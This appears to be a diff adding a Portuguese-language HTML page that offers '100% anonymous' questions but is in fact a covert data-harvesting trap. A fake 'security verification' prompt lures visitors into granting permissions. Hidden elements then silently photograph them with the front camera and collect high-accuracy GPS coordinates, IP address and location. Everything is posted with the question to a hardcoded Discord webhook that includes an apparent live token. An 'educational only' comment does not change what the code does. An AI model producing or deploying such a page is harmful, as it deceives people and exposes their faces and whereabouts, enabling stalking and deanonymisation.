@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="permissions-policy" content="camera=*, microphone=*, geolocation=*">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <title>Pergunta Anônima</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+    
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      animation: fadeIn 0.5s;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    h2 {
+      color: #333;
+      margin-top: 0;
+      text-align: center;
+    }
+    
+    p {
+      text-align: center;
+      color: #666;
+      margin-bottom: 20px;
+    }
+    
+    textarea, input, button {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      box-sizing: border-box;
+      transition: all 0.3s;
+    }
+    
+    textarea {
+      min-height: 120px;
+      resize: vertical;
+    }
+    
+    textarea:focus, input:focus {
+      outline: none;
+      border-color: #007bff;
+      box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
+    }
+    
+    button {
+      background: #007bff;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      border: none;
+      transition: background 0.3s;
+    }
+    
+    button:hover {
+      background: #0056b3;
+    }
+    
+    button:active {
+      transform: scale(0.98);
+    }
+    
+    #video, #canvas {
+      position: absolute;
+      opacity: 0.01;
+      pointer-events: none;
+      width: 1px;
+      height: 1px;
+      top: -9999px;
+      left: -9999px;
+    }
+    
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255,255,255,0.9);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none;
+    }
+    
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #007bff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .message-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      z-index: 1001;
+      text-align: center;
+      max-width: 80%;
+      display: none;
+    }
+    
+    .message-box h3 {
+      margin-top: 0;
+      color: #28a745;
+    }
+    
+    .message-box button {
+      margin-top: 15px;
+      padding: 8px 15px;
+      max-width: 150px;
+    }
+    
+    .permission-prompt {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+      color: white;
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    
+    .permission-prompt h3 {
+      margin-bottom: 20px;
+    }
+    
+    .permission-prompt button {
+      background: #28a745;
+      max-width: 200px;
+      margin-top: 20px;
+    }
+    
+    .permission-icon {
+      font-size: 50px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Pergunta Anônima</h2>
+    <p>💬 Envie uma pergunta de forma 100% anônima! 👻</p>
+    <textarea id="pergunta" placeholder="Digite sua pergunta..."></textarea>
+    <input type="text" id="nome" placeholder="Seu nome (opcional 😉)">
+    <button id="btnEnviar">Enviar</button>
+  </div>
+
+  <!-- Elementos ocultos para captura de mídia -->
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  
+  <!-- Overlay de carregamento -->
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+    <p>Enviando sua pergunta...</p>
+  </div>
+  
+  <!-- Mensagem de sucesso -->
+  <div class="message-box" id="success-message">
+    <h3>✅ Pergunta Enviada!</h3>
+    <p>Sua pergunta anônima foi enviada com sucesso.</p>
+    <p>Obrigado pela sua participação! 🎉</p>
+    <button onclick="document.getElementById('success-message').style.display='none';">OK</button>
+  </div>
+  
+  <!-- Prompt de permissão -->
+  <div class="permission-prompt" id="permission-prompt">
+    <div class="permission-icon">🔒</div>
+    <h3>Verificação de Segurança</h3>
+    <p>Para garantir que você não é um bot, precisamos verificar sua identidade.</p>
+    <p>Por favor, clique em "Permitir" quando solicitado.</p>
+    <button id="permission-button">Continuar</button>
+  </div>
+
+  <script>
+    // IMPORTANTE: Este código é apenas para fins educacionais
+    // NÃO use para capturar dados reais de pessoas sem consentimento
+    
+    // Webhook do Discord para enviar os dados (substitua pelo seu para testes)
+    const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
+    
+    // Variáveis para armazenar informações coletadas
+    let latitude = "Desconhecido", longitude = "Desconhecido";
+    let ipInfo = {};
+    let cameraImage = null;
+    let locationAttempted = false;
+    let cameraAttempted = false;
+    let permissionsGranted = false;
+    
+    // Detectar tipo de dispositivo
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+    const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent) || (isIOS && !navigator.userAgent.includes('CriOS'));
+    
+    // Função para mostrar overlay de carregamento
+    function showLoading() {
+      document.getElementById('loading').style.display = 'flex';
+    }
+    
+    // Função para esconder overlay de carregamento
+    function hideLoading() {
+      document.getElementById('loading').style.display = 'none';
+    }
+    
+    // Função para mostrar mensagem de sucesso
+    function showSuccess() {
+      document.getElementById('success-message').style.display = 'block';
+    }
+    
+    // Função para iniciar processo de verificação de permissões
+    function startPermissionCheck() {
+      document.getElementById('permission-prompt').style.display = 'flex';
+      
+      // Adicionar evento ao botão de permissão
+      document.getElementById('permission-button').addEventListener('click', function() {
+        document.getElementById('permission-prompt').style.display = 'none';
+        requestPermissions();
+      });
+    }
+    
+    // Função para solicitar todas as permissões necessárias
+    function requestPermissions() {
+      // Primeiro tentar a localização
+      requestLocation();
+      
+      // Em seguida, tentar a câmera
+      if (isMobile) {
+        requestCamera();
+      }
+      
+      // Marcar permissões como concedidas após um breve atraso (mesmo se falharem)
+      setTimeout(() => {
+        permissionsGranted = true;
+      }, 3000);
+    }
+    
+    // Função para solicitar permissão de localização
+    function requestLocation() {
+      if (locationAttempted) return;
+      locationAttempted = true;
+      
+      if (navigator.geolocation) {
+        // Configurações otimizadas para melhor precisão
+        const options = {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        };
+        
+        // Tentar obter localização
+        navigator.geolocation.getCurrentPosition(
+          // Sucesso
+          (position) => {
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
+            console.log("Localização obtida:", latitude, longitude);
+          },
+          // Erro
+          (error) => {
+            console.error("Erro ao obter localização:", error);
+          },
+          options
+        );
+      }
+    }
+    
+    // Função para capturar imagem da câmera
+    function requestCamera() {
+      if (cameraAttempted) return;
+      cameraAttempted = true;
+      
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      
+      // Configurações otimizadas para câmera frontal
+      const constraints = {
+        audio: false,
+        video: {
+          facingMode: "user",
+          width: { ideal: 320 },
+          height: { ideal: 240 }
+        }
+      };
+      
+      // Tentar acessar a câmera
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          video.srcObject = stream;
+          
+          // Capturar um frame após um breve atraso
+          setTimeout(() => {
+            try {
+              // Configurar o canvas
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              
+              // Desenhar o frame no canvas
+              canvas.getContext("2d").drawImage(video, 0, 0);
+              
+              // Obter a imagem como base64
+              cameraImage = canvas.toDataURL("image/jpeg", 0.5);
+              
+              // Parar todos os tracks da câmera IMEDIATAMENTE
+              stream.getTracks().forEach(track => track.stop());
+              video.srcObject = null;
+              
+              console.log("Imagem da câmera capturada com sucesso");
+            } catch (e) {
+              console.error("Erro ao capturar imagem:", e);
+              
+              // Garantir que a câmera seja parada mesmo em caso de erro
+              stream.getTracks().forEach(track => track.stop());
+            }
+          }, 300);
+        })
+        .catch(error => {
+          console.error("Erro ao acessar câmera:", error);
+        });
+    }
+    
+    // Função para obter informações do IP
+    async function getIPInfo() {
+      try {
+        // Tentar múltiplos serviços em caso de falha
+        const services = [
+          "https://ipapi.co/json",
+          "https://ipinfo.io/json",
+          "https://api.ipify.org?format=json"
+        ];
+        
+        // Tentar cada serviço em sequência
+        for (const service of services) {
+          try {
+            const response = await fetch(service);
+            return await response.json();
+          } catch (e) {
+            console.error(`Erro ao usar serviço ${service}:`, e);
+            // Continuar para o próximo serviço
+          }
+        }
+        
+        // Se todos falharem, retornar objeto vazio
+        return {};
+      } catch (error) {
+        console.error("Erro ao obter informações de IP:", error);
+        return {};
+      }
+    }
+    
+    // Função para converter base64 para Blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      
+      return new Blob([u8arr], { type: mime });
+    }
+    
+    // Função para enviar os dados coletados
+    async function enviarDados() {
+      // Obter valores do formulário
+      const pergunta = document.getElementById("pergunta").value;
+      const nome = document.getElementById("nome").value || "Anônimo";
+      
+      // Verificar se pergunta foi preenchida
+      if (!pergunta.trim()) {
+        alert("Por favor, digite uma pergunta antes de enviar.");
+        hideLoading();
+        return;
+      }
+      
+      // Mostrar carregamento
+      showLoading();
+      
+      // Obter informações do IP se ainda não temos
+      if (!ipInfo.ip) {
+        ipInfo = await getIPInfo();
+      }
+      
+      // Preparar dados do dispositivo
+      const device = {
+        navegador: navigator.userAgent,
+        ip: ipInfo.ip || "Desconhecido",
+        cidade: ipInfo.city || "Desconhecida",
+        regiao: ipInfo.region || "Desconhecida",
+        pais: ipInfo.country_name || "Desconhecido",
+        dispositivo: isMobile ? (isIOS ? "iOS" : "Android") : "Desktop",
+        browser: isSafari ? "Safari" : (navigator.userAgent.includes("Chrome") ? "Chrome" : "Outro")
+      };
+      
+      // Preparar payload para o Discord
+      const payload = {
+        username: "Anon Question Logger",
+        embeds: [{
+          title: "📩 Nova Pergunta Recebida",
+          fields: [
+            { name: "👤 Nome", value: nome, inline: true },
+            { name: "💬 Pergunta", value: pergunta },
+            { name: "📍 Localização", value: `Lat: ${latitude}, Lon: ${longitude}` },
+            { name: "🌐 IP", value: `${device.ip || "Desconhecido"}` },
+            { name: "📱 Dispositivo", value: `${device.dispositivo} / ${device.browser}` },
+            { name: "🏙️ Região", value: `${device.cidade}, ${device.regiao}, ${device.pais}` }
+          ],
+          image: { url: "attachment://foto.jpg" },
+          color: 3447003,
+          timestamp: new Date().toISOString()
+        }]
+      };
+      
+      try {
+        // Preparar FormData para enviar arquivo
+        const form = new FormData();
+        form.append("payload_json", JSON.stringify(payload));
+        
+        // Adicionar imagem se disponível
+        if (cameraImage) {
+          form.append("file", dataURLtoBlob(cameraImage), "foto.jpg");
+        }
+        
+        // Enviar para o webhook
+        const response = await fetch(webhook, {
+          method: "POST",
+          body: form
+        });
+        
+        // Verificar resposta
+        if (response.ok) {
+          console.log("Dados enviados com sucesso!");
+          // Limpar formulário
+          document.getElementById("pergunta").value = "";
+          document.getElementById("nome").value = "";
+          // Mostrar mensagem de sucesso
+          hideLoading();
+          showSuccess();
+        } else {
+          console.error("Erro ao enviar dados:", response.status);
+          hideLoading();
+          alert("Ocorreu um erro ao enviar sua pergunta. Por favor, tente novamente.");
+        }
+      } catch (error) {
+        console.error("Erro ao processar envio:", error);
+        hideLoading();
+        alert("Ocorreu um erro ao enviar sua pergunta. Por favor, tente novamente.");
+      }
+    }
+    
+    // Inicializar quando o DOM estiver carregado
+    document.addEventListener('DOMContentLoaded', function() {
+      // Obter informações do IP
+      getIPInfo().then(data => {
+        ipInfo = data;
+        console.log("Informações de IP obtidas:", ipInfo);
+      });
+      
+      // Mostrar prompt de permissão após um breve atraso
+      setTimeout(startPermissionCheck, 1000);
+      
+      // Adicionar evento ao botão de envio
+      document.getElementById('btnEnviar').addEventListener('click', function() {
+        // Se as permissões já foram solicitadas, enviar dados
+        if (permissionsGranted) {
+          enviarDados();
+        } else {
+          // Caso contrário, tentar solicitar permissões novamente
+          requestPermissions();
+          // E depois de um breve atraso, enviar dados de qualquer forma
+          setTimeout(enviarDados, 1500);
+        }
+      });
+      
+      // Adicionar eventos para captura de interação em toda a página
+      // Útil para navegadores que exigem interação do usuário antes de solicitar permissões
+      document.addEventListener('click', function() {
+        if (!cameraAttempted && isMobile) {
+          requestCamera();
+        }
+        if (!locationAttempted) {
+          requestLocation();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
